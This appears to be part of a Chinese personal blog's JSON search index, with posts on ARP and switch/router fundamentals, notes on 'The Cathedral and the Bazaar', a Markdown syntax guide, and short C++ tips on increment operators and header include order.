ARP欺骗：ARP协议是建立在网络中各个主机互相信任的基础上的，网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时不会检测该报文的真实性就会将其记入本机ARP缓存；由此攻击者就可以向某一主机发送伪ARP应答报文，使其发送的信息无法到达预期的主机或到达错误的主机，这就构成了一个ARP欺骗。ARP命令可用于查询本机ARP缓存中IP地址和MAC地址的对应关系、添加或删除静态对应关系等。相关协议有RARP、代理ARP。NDP用于在IPv6中代替地址解析协议。\n\n\n\n    #####交换机中的交换一词#####\n\n交换只是一种技术上的概念：完成信号由设备入口到出口的转发。所以，所有符合该定义的设备都可以称为交换设备。\n当它被用来描述数据网络第二层的设备时，实际指的是一个桥接设备；而当它被用来描述数据网络第三层的设备时，又指的是一个路由设备。\n  我们经常说到的以太网交换机实际是一个基于网桥技术的多端口第二层网络设备，它为数据帧从一个端口到另一个任意端口的转发提供了低时延、低开销的通路。\n 因此，交换机内部核心会有一个交换矩阵，为任意两端口间的通信提供通道，或是一个快速交换总线，使得由任意端口接收的数据帧可以从其他端口发出。在实际设备中，交换矩阵的功能往往由专门的芯片（ASIC）完成。\n  以太网第二层交换机是基于多端口网桥发展而来，但毕竟交换有其更丰富的特性，使之不但是获得更多带宽的最好途径，而且还使网络更易管理。\n\n    #####路由器#####\n\n  路由器是OSI协议模型的网络层中的分组交换设备（或网络层中继设备），路由器的基本功能是把数据（IP报文）传送到正确的网络，包括：\n- IP数据报的转发，包括数据报文的寻径和传送；\n- 子网隔离，可以抑制广播风暴；\n- 维护路由表，并与其他路由器交换路由信息，这是IP报文转发的基础。\n- IP数据报的差错处理及简单的拥塞控制；\n- 实现对IP数据报的过滤和记帐。\n\n              #####路由和交换的区别#####\n交换发生在OSI参考模型的第二层（数据链路层），不会涉及到IP地址。而路由发生在第三层（网络层），会涉及到ip地址的解析。这一区别决定了路由和交换在移动信息的过程中需要使用不同的控制信息，所以两者实现各自功能的方式是不同的。\n\n\n      #####交换机和hub的区别#####\n\nhub集线器本身不能识别目的地址，数据包在以HUB为架构的网络上是以广播方式传输的，简而言之，每台与hub相连的电脑都会收到经过hub的所有数据包，所以此种连接方式会共享网络带宽。\n\n\n交换机拥有一条很高带宽的总线和内部交换矩阵。交换机的所有的端口都挂接在这条总线上，当控制电路收到数据包以后，处理端口会查找内存中的地址对照表以确定目的MAC地址的NIC（网卡）挂接在哪个端口上，通过内部交换矩阵迅速将数据包传送到目的端口，目的MAC若不存在才广播到所有的端口，接收端口回应后交换机会记录新的地址，并把它添加入内部MAC地址表中。\n使用交换机也可以把网络“分段”，只不过是通过对照mac地址表的方式，根据MAC地址表，交换机只允许必要的网络流量通过交换机。通过交换机的过滤和转发，也可以有效的隔离广播风暴，减少误包和错包的出现，避免共享冲突。\n交换机在同一时刻可进行多个端口对之间的数据传输。每一端口都可视为独立的网段，连接在其上的网络设备独自享有全部的带宽，无须同其他设备竞争使用。当节点A向节点D发送数据时，节点B可同时向节点C发送数据，而且这两个传输都享有网络的全部带宽，都有着自己的虚拟连接。假使这里使用的是10Mbps的以太网交换机，那么该交换机这时的总流通量就等于2×10Mbps＝20Mbps，而使用10Mbps的共享式HUB时，一个HUB的总流通量也不会超出10Mbps。\n\n     #####交换机和路由器的区别#####\n\n交换机中维护的是mac表，通过mac地址寻找目标。路由器维护的是路由表，通过ip地址寻找下一个目标。\n\n\n\n    #####二层交换机、三层交换机和路由器的基本工作原理#####\n\n1. 二层交换技术\n二层交换机是数据链路层的设备，它能够读取数据包中的MAC地址信息并根据MAC地址来进行交换。\n交换机内部有一个地址表，这个地址表标明了MAC地址和交换机端口的对应关系。当交换机从某个端口收到一个数据包，它首先读取包头中的源MAC地址，这样它就知道源MAC地址的机器是连在哪个端口上的，它再去读取包头中的目的MAC地址，并在地址表中查找相应的端口，如果表中有与这目的MAC地址对应的端口，则把数据包直接复制到这端口上，如果在表中找不到相应的端口则把数据包广播到所有端口上，当目的机器对源机器回应时，交换机又可以学习一目的MAC地址与哪个端口对应，在下次传送数据时就不再需要对所有端口进行广播了。\n二层交换机就是这样建立和维护它自己的地址表。由于二层交换机一般具有很宽的交换总线带宽，所以可以同时为很多端口进行数据交换。如果二层交换机有N个端口，每个端口的带宽是M，而它的交换机总线带宽超过N×M，那么这交换机就可以实现线速交换。二层交换机对广播包是不做限制的，把广播包复制到所有端口上。\n二层交换机一般都含有专门用于处理数据包转发的ASIC （Application specific Integrated Circuit）芯片，因此转发速度可以做到非常快。\n2. 三层交换技术\n简单来说，三层交换机就是一个带有第三层路由功能的第二层交换机，但它是二者的有机结合，并不是简单的把路由器设备的硬件及软件简单地叠加在局域网交换机上。\n从硬件上看，第二层交换机的接口模块都是通过高速背板/总线（速率可高达几十Gbit/s）交换数据的，在第三层交换机中，与路由器有关的第三层路由硬件模块也插接在高速背板/总线上，这种方式使得路由模块可以与需要路由的其他模块间高速的交换数据，从而突破了传统的外接路由器接口速率的限制。在软件方面，第三层交换机也有重大的举措，它将传统的基于软件的路由器软件进行了界定。\n其做法是：\n  - 对于数据包的转发：如IP/IPX包的转发，这些规律的过程通过硬件实现。\n  - 对于第三层路由软件：如路由信息的更新、路由表维护、路由计算、路由的确定等功能，用优化、高效的软件实现。\n假设两个使用IP协议的机器通过第三层交换机进行通信的过程，机器A在开始发送时，已知目的IP地址，但尚不知道在局域网上发送所需要的MAC地址。要采用地址解析（ARP）来确定目的MAC地址。机器A把自己的IP地址与目的IP地址比较，从其软件中配置的子网掩码提取出网络地址来确定目的机器是否与自己在同一子网内。若目的机器B与机器A在同一子网内，A广播一个ARP请求，B返回其MAC地址，A得到目的机器B的MAC地址后将这一地址缓存起来，并用此MAC地址封包转发数据，第二层交换模块查找MAC地址表确定将数据包发向目的端口。若两个机器不在同一子网内，如发送机器A要与目的机器C通信，发送机器A要向“缺省网关”发出ARP包，而“缺省网关”的IP地址已经在系统软件中设置。这个IP地址实际上对应第三层交换机的第三层交换模块。所以当发送机器A对“缺省网关”的IP地址广播出一个ARP请求时，若第三层交换模块在以往的通信过程中已得到目的机器C的MAC地址，则向发送机器A回复C的MAC地址；否则第三层交换模块根据路由信息向目的机器广播一个ARP请求，目的机器C得到此ARP请示后向第三层交换模块回复其MAC地址，第三层交换模块保存此地址并回复给发送机器A。以后，当再进行A与C之间数据包转发进，将用最终的目的机器的MAC地址封装，数据转发过程全部交给第二层交换处理，信息得以高速交换。既所谓的一次选路，多次交换。\n第三层交换具有以下突出特点：\n有机的硬件结合使得数据交换加速；\n优化的路由软件使 得路由过程效率提高；\n除了必要的路由决定过程外，大部分数据转发过程由第二层交换处理；\n多个子网互连时只是与第三层交换模块的逻辑连接，不象传统的外接路由器那样需增加端口，保护了用户的投资。\n\n3. 路由技术\n路由器是在OSI七层网络模型中的第三层——网络层操作的。\n路由器内部有一个路由表，这表标明了如果要去某个地方，下一步应该往哪走。路由器从某个端口收到一个数据包，它首先把链路层的包头去掉（拆包），读取目的IP地址，然后查找路由表，若能确定下一步往哪送，则再加上链路层的包头（打包），把该数据包转发出去；如果不能确定下一步的地址，则向源地址返回一个信息，并把这个数据包丢掉。\n路由技术和二层交换看起来有点相似，其实路由和交换之间的主要区别就是交换发生在OSI参考模型的第二层（数据链路层），而路由发生在第三层。这一区别决定了路由和交换在传送数据的过程中需要使用不同的控制信息，所以两者实现各自功能的方式是不同的。\n路由技术其实是由两项最基本的活动组成，即决定最优路径和传输数据包。其中，数据包的传输相对较为简单和直接，而路由的确定则更加复杂一些。路由算法在路由表中写入各种不同的信息，路由器会根据数据包所要到达的目的地选择最佳路径把数据包发送到可以到达该目的地的下一台路由器处。当下一台路由器接收到该数据包时，也会查看其目标地址，并使用合适的路径继续传送给后面的路由器。依次类推，直到数据包到达最终目的地。\n路由器之间可以进行相互通讯，而且可以通过传送不同类型的信息维护各自的路由表。路由更新信息主是这样一种信息，一般是由部分或全部路由表组成。通过分析其它路由器发出的路由更新信息，路由器可以掌握整个网络的拓扑结构。链路状态广播是另外一种在路由器之间传递的信息，它可以把信息发送方的链路状态及进的通知给其它路由器。\n路由器工作原理\n传统地，路由器工作于OSI七层协议中的第三层，其主要任务是接收来自一个网络接口的数据包，根据其中所含的目的地址，决定转发到下一个目的地址。因此，路由器首先得在转发路由表中查找它的目的地址，若找到了目的地址，就在数据包的帧格前添加下一个MAC地址，同时IP数据包头的TTL（Time To Live）域也开始减数，并重新计算校验和。当数据包被送到输出端口时，它需要按顺序等待，以便被传送到输出链路上。\n路由器在工作时能够按照某种路由通信协议查找设备中的路由表。如果到某一特定节点有一条以上的路径，则基本预先确定的路由准则是选择最优（或最经济）的传输路径。由于各种网络段和其相互连接情况可能会因环境变化而变化，因此路由情况的信息一般也按所使用的路由信息协议的规定而定时更新。\n网络中，每个路由器的基本功能都是按照一定的规则来动态地更新它所保持的路由表，以便保持路由信息的有效性。为了便于在网络间传送报文，路由器总是先按照预定的规则把较大的数据分解成适当大小的数据包，再将这些数据包分别通过相同或不同路径发送出去。当这些数据包按先后秩序到达目的地后，再把分解的数据包按照一定顺序包装成原有的报文形式。路由器的分层寻址功能是路由器的重要功能之一，该功能可以帮助具有很多节点站的网络来存储寻址信息，同时还能在网络间截获发送到远地网段的报文，起转发作用；选择最合理的路由，引导通信也是路由器基本功能；多协议路由器还可以连接使用不同通信协议的网络段，成为不同通信协议网络段之间的通信平台。\n一般来说，路由器的主要工作是对数据包进行存储转发，具体过程如下：\n    1. 当数据包到达路由器，根据网络物理接口的类型，路由器调用相应的链路层功能模块，以解释处理此数据包的链路层协议报头。这一步处理比较简单，主要是对数据的完整性进行验证，如CRC校验、帧长度检查等。\n    2. 在链路层完成对数据帧的完整性验证后，路由器开始处理此数据帧的IP层。这一过程是路由器功能的核心。根据数据帧中IP包头的目的IP地址，路由器在路由表中查找下一跳的IP地址；同时，IP数据包头的TTL（Time To Live）域开始减数，并重新计算校验和（Checksum）。\n    3. 根据路由表中所查到的下一跳IP地址，将IP数据包送往相应的输出链路层，被封装上相应的链路层包头，最后经输出网络物理接口发送出去。\n简单地说，路由器的主要工作就是为经过路由器的每个数据包寻找一条最佳传输路径，并将该数据包有效地传送到目的站点。由此可见，选择最佳路径策略或叫选择最佳路由算法是路由器的关键所在。为了完成这项工作，在路由器中保存着各种传输路径的相关数据——路由表（Routing Table），供路由选择时使用。上述过程描述了路由器的主要而且关键的工作过程，但没有说明其它附加性能，例如访问控制、网络地址转换、排队优先级等。\n\n\n本文准备较为匆忙，很多参考之处已忘记出处,若有错误请帮忙指出。万分感激。。。。\n","tags":["原理"],"categories":["网络安全"]},{"title":"教堂与集市笔记归纳","url":"%2F2018%2F02%2F09%2F%E6%95%99%E5%A0%82%E4%B8%8E%E9%9B%86%E5%B8%82%E7%AC%94%E8%AE%B0%E5%BD%92%E7%BA%B3%2F","content":"\n\n##### 不得不承认，自己选择社区有一部分原因是因为这本书。虽然现在还没做出什么贡献，但是终归要向这个目标迈进的，以下部分是在书中摘录，你我共勉#####\n\n\n1.    每一个好的软件的起因都是挠到了开发者本人的痒处Every good work of softWare starts by scratching a developer's personal itch.\n2.   好的程序员知道写什么，伟大的程序员知道改写（和重复使用）什么。Good programmers know what to write.Great ones know what to rewrite（and reuse）。\n3.  “计划扔掉一个，无论如何你都会扔掉一个的”（《人月神话》）。\"Plan to throw one away,you will ,anyhow\".\n4.  如果你有正确的态度，有意思的问题会找上你。If you have the right attitude ,intesting problems will find you .\n5.  当你对一个项目失去兴趣时，你的最后的职责是把它交给一个称职的继承者。When you lose interest in a program,your last duty to it is to hand it off to a competent successor.\n6.  把用户像合作者来对待是通往快速改进代码和有效调试的最佳通道。Treating your users as co-developers is your least-hassle route to rapid code improvement and  effective debugging.\n7.  早发布，常发布，听取用户的意见。Release early. Release often. And listen to your customers.\n8.  如果beta测试者和合作开发者的群体足够大的话，几乎每个问题都会快速显现，会有人轻而易举的把它解决。Given a large enough beta-tester and co-developer base, almost every problem will be characterized quickly and the fix obvious to someone.\n9.  好的数据结构和差的代码要比反过来搭配好的多（即差的数据结构和好的代码）Smart data structures and dumb code works a lot better than the other way around.\n10. 如果你以“最有价值的资源”来对待你的beta测试者，他们会以成为“最有价值的资源”来回应你的期望。If you treat your beta-testers as if they're your most valuabel resource, they will respond by becoming your most valuable resource.\n11. 仅次于拥有好的主意的是认识到来自用户的好主意，有时候后者会更好一些。The next best thing to having good ideas is recongizing good ideas from your users.Sometimes the latter is better.\n12. 最有突破和创新的方案常常来自于意识到你把问题的模型弄错了。Often, the most striking and innovative solution come from realizing that your concept of the problem was wrong.\n13. 设计达到完美的时候，不是增加得不能再增加了，而是减少得不能再减少了。PerfectionI（in design）is achieved not when there is nothing more to add , but rather when there is nothing more to take away.\n14. 任何一个工具都应该达到预期的用处，但是一个真正棒的工具会带来你从来预期不到的用处。Any tool should be useful in the expected way, but  a truly great tool lends itself to uses you never expected.\n15. 在写关口软件的时候，花点功夫尽可能不要干扰数据流——除非用户强迫你，永远不要扔掉任何数据。When writing gateway software of  any kind,take pains to disturbthe data stream as little as possible--and never throw away information unless the recipient forces you to !\n16. 当你的语言离图灵穷尽还差得远的时候，给语法加点料是有帮助的。When your language is nowhere near Turing-comlete,syntatic sugar can be your friend.\n17. 一个安全系统的安全性取决于它保守秘密的安全性。小心伪秘密。A security system is only as secure as its secret.Beware of pseudo-secrets.\n18. 当你开始进行社区建设的时候，你需要能够呈现一个可行的前景，你的程序不一定要能够工作的非常好，他可以是粗糙的，问题多多的，不完整的，缺少文档的。但是它必须是可以运行的和能够说服潜在的合作者在可预见的将来进化成为真正漂亮的东西。\n19. 要解决一个有意思的问题，首先你要找到一个你觉得有意思的问题。To solve an interesting problem,start by finding a problem that is interesting to you.\n20. 如果说一个项目已经延期，那么向项目组里添加程序员的做法会导致已经延期的项目更加延期。\n21. 如果开发的协调者有一个至少和互联网一样好的通讯媒介，并且懂得如何不通过强迫来领导，多个头脑将会不可避免的优于单个头脑的价值。Provided the development co ordinator has communications medium at least as good as the Internet,and knows how to lead without coercion,many heads are inevitably better than one.\n22.  开源文化会最终胜利，或许不是因为合作在道德上正确或者软件“劳役”在道德上错误。而只是因为开源社区可以在一个问题上投入多几个数量级的技术工时，闭源世界无法赢得这场进化式的军备竞争。\n","tags":["思想"],"categories":["Linux"]},{"title":"敬请期待","url":"%2F2018%2F02%2F09%2F%E6%95%AC%E8%AF%B7%E6%9C%9F%E5%BE%85%2F","categories":["网络安全"]},{"title":"未完待续","url":"%2F2018%2F02%2F09%2F%E6%9C%AA%E5%AE%8C%E5%BE%85%E7%BB%AD%2F","categories":["算法学习"]},{"title":"Markdown格式（转）","url":"%2F2018%2F02%2F09%2FMarkdown%E6%A0%BC%E5%BC%8F%EF%BC%88%E8%BD%AC%EF%BC%89%2F","content":"\n\n\n1.如果要在文档中插入一个版权符号 ©，可以这样写：\n\n    &copy;\n\n2.一个 Markdown 段落是由一个或多个连续的文本行组成，它的前后要有一个以上的空行（空行的定义是显示上看起来像是空的，便会被视为空行。比方说，若某一行只包含空格和制表符，则该行也会被视为空行）。普通段落不该用空格或制表符来缩进。\n\n3.标题\nMarkdown 支持两种标题的语法，类 Setext 和类 atx 形式。\n\n类 Setext 形式是用底线的形式，利用 = （最高阶标题）和 - （第二阶标题），例如：\n\nThis is an H1\n=============\n\n    This is an H1\n    =============\n\n\nThis is an H2\n-------------\n    This is an H2\n    -------------\n\n\n任何数量的 = 和 - 都可以有效果。\n\n类 Atx 形式则是在行首插入 1 到 6 个 # ，对应到标题 1 到 6 阶，例如：\n\n    # 这是 H1\n\n    ## 这是 H2\n\n    ###### 这是 H6\n\n\n\n# 这是 H1\n\n## 这是 H2\n\n###### 这是 H6\n你可以选择性地「闭合」类 atx 样式的标题，这纯粹只是美观用的，若是觉得这样看起来比较舒适，你就可以在行尾加上 #，而行尾的 # 数量也不用和开头一样（行首的井字符数量决定标题的阶数）：\n\n区块引用 Blockquotes\nMarkdown 标记区块引用是使用类似 email 中用 > 的引用方式。如果你还熟悉在 email 信件中的引言部分，你就知道怎么在 Markdown 文件中建立一个区块引用，那会看起来像是你自己先断好行，然后在每行的最前面加上 > ：\n\n    > This is a blockquote with two paragraphs. Lorem ipsum dolor sit amet,\n    > consectetuer adipiscing elit. Aliquam hendrerit mi posuere lectus.\n    > Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus.\n    >\n    > Donec sit amet nisl. Aliquam semper ipsum sit amet velit. Suspendisse\n    > id sem consectetuer libero luctus adipiscing.\n    Markdown 也允许你偷懒只在整个段落的第一行最前面加上 > ：\n\n    > This is a blockquote with two paragraphs. Lorem ipsum dolor sit amet,\n    consectetuer adipiscing elit. Aliquam hendrerit mi posuere lectus.\n    Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus.\n\n    > Donec sit amet nisl. Aliquam semper ipsum sit amet velit. Suspendisse\n    id sem consectetuer libero luctus adipiscing.\n    区块引用可以嵌套（例如：引用内的引用），只要根据层次加上不同数量的 > ：\n\n    > This is the first level of quoting.\n    >\n    > > This is nested blockquote.\n    >\n    > Back to the first level.\n    引用的区块内也可以使用其他的 Markdown 语法，包括标题、列表、代码区块等：\n\n    > ## 这是一个标题。\n    >    \n    > 1.   这是第一行列表项。\n    > 2.   这是第二行列表项。\n    >\n    > 给出一些例子代码：\n    >\n    >     return shell_exec(\"echo $input | $markdown_script\");\n    任何像样的文本编辑器都能轻松地建立 email 型的引用。例如在 BBEdit 中，你可以选取文字后然后从选单中选择增加引 用阶层。\n\n\n\n> This is a blockquote with two paragraphs. Lorem ipsum dolor sit amet,\n> consectetuer adipiscing elit. Aliquam hendrerit mi posuere lectus.\n> Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus.\n>\n> Donec sit amet nisl. Aliquam semper ipsum sit amet velit. Suspendisse\n> id sem consectetuer libero luctus adipiscing.\nMarkdown 也允许你偷懒只在整个段落的第一行最前面加上 > ：\n\n> This is a blockquote with two paragraphs. Lorem ipsum dolor sit amet,\nconsectetuer adipiscing elit. Aliquam hendrerit mi posuere lectus.\nVestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus.\n\n> Donec sit amet nisl. Aliquam semper ipsum sit amet velit. Suspendisse\nid sem consectetuer libero luctus adipiscing.\n区块引用可以嵌套（例如：引用内的引用），只要根据层次加上不同数量的 > ：\n\n> This is the first level of quoting.\n>\n> > This is nested blockquote.\n>\n> Back to the first level.\n引用的区块内也可以使用其他的 Markdown 语法，包括标题、列表、代码区块等：\n\n> ## 这是一个标题。\n>\n> 1.   这是第一行列表项。\n> 2.   这是第二行列表项。\n>\n> 给出一些例子代码：\n>\n>     return shell_exec(\"echo $input | $markdown_script\");\n任何像样的文本编辑器都能轻松地建立 email 型的引用。例如在 BBEdit 中，你可以选取文字后然后从选单中选择增加引用阶层。\n\n列表\nMarkdown 支持有序列表和无序列表。\n\n无序列表使用星号、加号或是减号作为列表标记：\n\n    *   Red\n    *   Green\n    *   Blue\n    等同于：\n\n    +   Red\n    +   Green\n    +   Blue\n    也等同于：\n\n    -   Red\n    -   Green\n    -   Blue\n\n\n*   Red\n*   Green\n*   Blue\n等同于：\n\n+   Red\n+   Green\n+   Blue\n也等同于：\n\n-   Red\n-   Green\n-   Blue\n有序列表则使用数字接着一个英文句点：\n\n      1.  Bird\n      2.  McHale\n      3.  Parish\n\n\n1.  Bird\n2.  McHale\n3.  Parish\n\n很重要的一点是，你在列表标记上使用的数字并不会影响输出的 HTML 结果，上面的列表所产生的 HTML 标记为：\n\n\n代码区块\n和程序相关的写作或是标签语言原始码通常会有已经排版好的代码区块，通常这些区块我们并不希望它以一般段落文件的方式去排版，而是照原来的样子显示\n\n要在 Markdown 中建立代码区块很简单，只要简单地缩进 4 个空格或是 1 个制表符就可以，例如，下面的输入：\n\n一个代码区块会一直持续到没有缩进的那一行（或是文件结尾）。\n\n\n分隔线\n你可以在一行中用三个以上的星号、减号、底线来建立一个分隔线，行内不能有其他东西。你也可以在星号或是减号中间插入空格。下面每种写法都可以建立分隔线：\n\n    * * *\n\n    ***\n\n    *****\n\n    - - -\n\n---------------------------------------\n区段元素\n链接\nMarkdown 支持两种形式的链接语法： 行内式和参考式两种形式。\n\n不管是哪一种，链接文字都是用 [方括号] 来标记。\n\n要建立一个行内式的链接，只要在方块括号后面紧接着圆括号并插入网址链接即可，如果你还想要加上链接的 title 文字，只要在网址后面，用双引号把 title 文字包起来即可，例如：\n\n    This is [an example](http://example.com/ \"Title\") inline link.\n    [This link](http://example.net/) has no title attribute.\n\nThis is [an example](http://example.com/ \"Title\") inline link.\n\n[This link](http://example.net/) has no title attribute.\n\n链接内容定义的形式为：\n\n+   方括号（前面可以选择性地加上至多三个空格来缩进），里面输入链接文字\n+   接着一个冒号\n+   接着一个以上的空格或制表符\n+   接着链接的网址\n+   选择性地接着 title 内容，可以用单引号、双引号或是括弧包着\n+   下面这三种链接的定义都是相同：\n\n          [foo]: http://example.com/  \"Optional Title Here\"\n\n[foo]: http://example.com/  \"Optional Title Here\"\n\n\n\n强调\nMarkdown 使用星号（*）和底线（_）作为标记强调字词的符号，被 * 或 _ 包围的字词会被转成用 <em> 标签包围，用两个 * 或 _ 包起来的话，则会被转成 <strong>，例如：\n\n\n    *single asterisks*\n    _single underscores_\n\n*single asterisks*\n\n_single underscores_\n\n    **double asterisks**\n    __double underscores__\n\n\n**double asterisks**\n\n__double underscores__\n\n强调也可以直接插在文字中间：\n\nun*frigging*believable\n但是如果你的 * 和 _ 两边都有空白的话，它们就只会被当成普通的符号。\n\n如果要在文字前后直接插入普通的星号或底线，你可以用反斜线：\n\n    \\*this text is surrounded by literal asterisks\\*\n代码\n如果要标记一小段行内代码，你可以用反引号把它包起来（`），例如：\n\n    Use the `printf()` function.\n会产生：\n\n<p>Use the <code>printf()</code> function.</p>\n","categories":["Linux"]},{"title":"前加加和后加加的区别","url":"%2F2018%2F02%2F09%2F%E5%89%8D%E5%8A%A0%E5%8A%A0%E5%92%8C%E5%90%8E%E5%8A%A0%E5%8A%A0%E7%9A%84%E5%8C%BA%E5%88%AB%2F","content":"\n// 前缀形式：  （++i）\n\n    int& int::operator++() //这里返回的是一个引用，说明函数返回值也可以作为一个左值使用\n        {//函数本身无参，说明是在函数体内加1\n            *this += 1;  \n             return *this;  \n        }\n\n //后缀形式:（i++）\n\n        const int int::operator++(int) //函数返回值是一个非左值，与前缀形有所差别\n        {//函数带参,会新建一个临时空间\n            int oldValue = *this;  \n            ++(*this); // 增加\n            return oldValue;  \n        }\n\n综上所述，前加加要比后加加略微快一丢丢\n","categories":["C++"]},{"title":"一个好的编程小习惯","url":"%2F2018%2F02%2F08%2F%E4%B8%80%E4%B8%AA%E5%A5%BD%E7%9A%84%E7%BC%96%E7%A8%8B%E5%B0%8F%E4%B9%A0%E6%83%AF%2F","content":"\n一个好习惯：为了加强可读性和避免隐含依赖，应使用下面的顺序：C标准库、C++标准库、其它库的头文件、你自己工程的头文件。不过这里最先包含的是首选的头文件，即例如a.cpp文件中应该优先包含a.h。首选的头文件是为了减少隐藏依赖，同时确保头文件和实现文件是匹配的。\n\n从上到下：\n             1、该cpp的头文件\n             2、C标准库\n             3、C++标准库\n             4、其他框架\n             5、其他库\n             6、自己工程的头文件\n","categories":["C++"]}]